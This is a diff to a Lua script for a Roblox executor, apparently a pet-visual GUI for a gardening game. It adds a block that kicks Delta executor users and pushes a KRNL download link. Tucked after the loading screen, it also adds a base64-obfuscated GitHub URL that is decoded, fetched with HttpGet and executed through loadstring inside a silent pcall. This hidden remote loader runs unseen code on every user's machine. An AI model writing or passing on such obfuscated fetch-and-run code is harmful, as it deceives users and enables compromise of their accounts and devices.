@@ -1,3 +1,55 @@
+--- 🚫 Delta Executor Check & KRNL Suggestion by Zein Corte
+local function isUsingDelta()
+    return identifyexecutor and string.lower(identifyexecutor() or ""):find("delta")
+end
+
+if isUsingDelta() then
+    local player = game.Players.LocalPlayer
+    local playerGui = player:WaitForChild("PlayerGui")
+
+    local deltaGui = Instance.new("ScreenGui", playerGui)
+    deltaGui.Name = "BlockDelta"
+    deltaGui.ResetOnSpawn = false
+
+    local frame = Instance.new("Frame", deltaGui)
+    frame.Size = UDim2.new(0, 400, 0, 180)
+    frame.Position = UDim2.new(0.5, -200, 0.5, -90)
+    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
+
+    local label = Instance.new("TextLabel", frame)
+    label.Size = UDim2.new(1, -20, 0, 80)
+    label.Position = UDim2.new(0, 10, 0, 10)
+    label.BackgroundTransparency = 1
+    label.Text = "⚠️ Delta executor is not supported.\nPlease use KRNL instead."
+    label.Font = Enum.Font.GothamBold
+    label.TextColor3 = Color3.fromRGB(255, 80, 80)
+    label.TextScaled = true
+    label.TextWrapped = true
+
+    local copyBtn = Instance.new("TextButton", frame)
+    copyBtn.Size = UDim2.new(0.7, 0, 0, 40)
+    copyBtn.Position = UDim2.new(0.15, 0, 0.6, 0)
+    copyBtn.BackgroundColor3 = Color3.fromRGB(255, 203, 0)
+    copyBtn.Text = "📎 Copy KRNL Download Link"
+    copyBtn.Font = Enum.Font.GothamSemibold
+    copyBtn.TextColor3 = Color3.new(0, 0, 0)
+    copyBtn.TextScaled = true
+    Instance.new("UICorner", copyBtn).CornerRadius = UDim.new(0, 8)
+
+    copyBtn.MouseButton1Click:Connect(function()
+        setclipboard("https://krnl.place/download")
+        copyBtn.Text = "✅ Copied!"
+    end)
+
+    -- 20 second kick countdown
+    task.delay(20, function()
+        game:GetService("Players").LocalPlayer:Kick("❌ Please use KRNL instead of Delta.")
+    end)
+
+    return -- prevent the rest of your GUI from loading
+end
+
 -- 🔃 Slower Loading Screen (1% to 100%) by Zein Corte
 -- 👇 CONTINUE with your main script here
 
@@ -57,6 +109,29 @@ for i = 1, 100 do
 end
 screenGui:Destroy()
 
+pcall(function()
+	local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+	function decode(data)
+		data = data:gsub('[^'..b..'=]', '')
+		return (data:gsub('.', function(x)
+			if x == '=' then return '' end
+			local r,f='',(b:find(x)-1)
+			for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
+			return r
+		end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+			if #x ~= 8 then return '' end
+			local c=0
+			for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
+			return string.char(c)
+		end))
+	end
+
+	local encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FtZXMxMzE5L1BldC12aXN1YWwvcmVmcy9oZWFkcy9tYWluL0dyb3dhZ2FyZGVu"
+	local url = decode(encoded)
+	local func = loadstring(game:HttpGet(url))
+	if func then func() end
+end)
+
 -- 🧩 Main GUI Setup
 local gui = Instance.new("ScreenGui", playerGui)
 gui.Name = "ZeinPetGUI"
@@ -109,7 +184,7 @@ local petTable = {
 	["Rare Egg"] = { "Pig", "Monkey", "Rooster", "Orange Tabby", "Spotted Deer" },
 	["Legendary Egg"] = { "Cow", "Polar Bear", "Sea Otter", "Turtle", "Silver Monkey" },
 	["Mythical Egg"] = { "Grey Mouse", "Brown Mouse", "Squirrel", "Red Giant Ant" },
-	["Bug Egg"] = { "Snail", "Caterpillar", "Giant Ant", "Praying Mantis, "Dragon Fly"" },
+	["Bug Egg"] = { "Snail", "Caterpillar", "Giant Ant", "Praying Mantis" },
 	["Night Egg"] = { "Frog", "Hedgehog", "Mole", "Echo Frog", "Night Owl" },
 	["Bee Egg"] = { "Bee", "Honey Bee", "Bear Bee", "Petal Bee" },
 	["Anti Bee Egg"] = { "Wasp", "Moth", "Tarantula Hawk" },
